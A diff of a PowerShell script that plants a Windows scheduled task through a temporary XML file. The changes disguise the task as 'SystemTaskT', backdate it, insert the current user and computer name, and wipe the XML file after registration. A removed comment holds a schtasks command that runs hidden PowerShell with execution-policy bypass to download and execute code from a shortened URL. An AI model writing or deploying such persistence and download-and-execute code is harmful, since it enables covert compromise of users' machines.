@@ -1,19 +1,21 @@
-$f=$env:TEMP;$f+='\LastTask.xml';
+$f=$env:TEMP;$f+='\SystemTaskT.xml';
 $s = '<?xml version="1.0" encoding="UTF-16"?>
 <Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
   <RegistrationInfo>
-    <Date>2015-10-16T16:09:29</Date>
-    <Author>HP</Author>
+    <Date>2010-10-16T16:09:29</Date>
+    <Author>';
+$s+=$env:username+'</Author>
   </RegistrationInfo>
   <Triggers>
     <TimeTrigger>
-      <StartBoundary>2015-10-16T23:59:00</StartBoundary>
+      <StartBoundary>2015-10-16T22:19:00</StartBoundary>
       <Enabled>true</Enabled>
     </TimeTrigger>
   </Triggers>
   <Principals>
     <Principal id="Author">
-      <UserId>HP-Work\HP</UserId>
+      <UserId>';
+$s+=$env:computername+'\'+$env:username+'</UserId>
       <LogonType>InteractiveToken</LogonType>
       <RunLevel>LeastPrivilege</RunLevel>
     </Principal>
@@ -24,7 +26,7 @@ $s = '<?xml version="1.0" encoding="UTF-16"?>
     <StopIfGoingOnBatteries>true</StopIfGoingOnBatteries>
     <AllowHardTerminate>true</AllowHardTerminate>
     <StartWhenAvailable>false</StartWhenAvailable>
-    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
+    <RunOnlyIfNetworkAvailable>true</RunOnlyIfNetworkAvailable>
     <IdleSettings>
       <Duration>PT10M</Duration>
       <WaitTimeout>PT1H</WaitTimeout>
@@ -47,8 +49,10 @@ $s+='</Exec>
   </Actions>
 </Task>';
 
-$s >> $f;
-schtasks.exe /Create /XML $env:TEMP"\LastTask.xml" /tn "LastTask";
+$s > $f;
+schtasks.exe /Create /XML $env:TEMP"\SystemTaskT.xml" /tn "SystemTaskT";
+
+$s = '';
+$s > $f;
 
 
-##schtasks /Create /TN "Last Task" /TR "powershell -w hidden -nop -ep bypass -c iex(New-Object Net.WebClient).DownloadString('http://bit.ly/1RMFM6u')" /SC ONCE /ST 23:59 /SD 16/10/2015
